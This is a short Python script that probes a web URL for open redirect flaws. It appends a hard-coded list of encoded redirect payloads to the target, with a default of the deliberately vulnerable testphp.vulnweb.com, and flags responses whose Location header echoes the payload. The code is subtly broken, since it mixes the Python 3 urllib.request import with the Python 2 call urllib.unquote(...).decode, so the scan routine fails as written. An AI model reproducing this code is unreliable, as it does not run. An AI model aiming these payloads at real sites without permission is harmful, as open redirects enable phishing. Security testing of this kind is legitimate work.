import urllib
import requests
from urllib.request import urlopen
from urllib.error import HTTPError, URLError

""" You should suppLy an url like that test.com/file.php?redirc= in order to work that correctly"""


class openredirect:
    payloads = ["//www.google.com/%2e%2e", "//example.com@google.com/%2f..",
                "///google.com/%2f..", "///example.com@google.com/%2f.."]

    def __init__(self, url, cookies=None, headers=None):
        self.url = url
        self.cookies = cookies if cookies is not None else ""
        self.headers = headers if headers is not None else {
            "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101"}

    def set_url(self, new_url):
        self.url = new_url

    def checker(self):
        try:
            response = urlopen(self.url)
        except HTTPError:
            return "not valid"
        except URLError as e:
            return "not valid"
        else:
            html = response.read()
            return "up"

    def scan_url(self, payloads):
        for payload in payloads:
            target = self.url + payload
            req = requests.get(target, headers=self.headers, allow_redirects=False)
            if "Location" in req.headers and urllib.unquote(payload).decode('utf8') in req.headers["Location"]:
                print("May be Vulnerable : {} to this payload : {}".format(self.url, payload))
            else:
                print("Payload tried and seems not vulnerable; {}".format(target))


if __name__ == '__main__':
    odir = openredirect(url="http://testphp.vulnweb.com")
    odir.scan_url(openredirect.payloads)
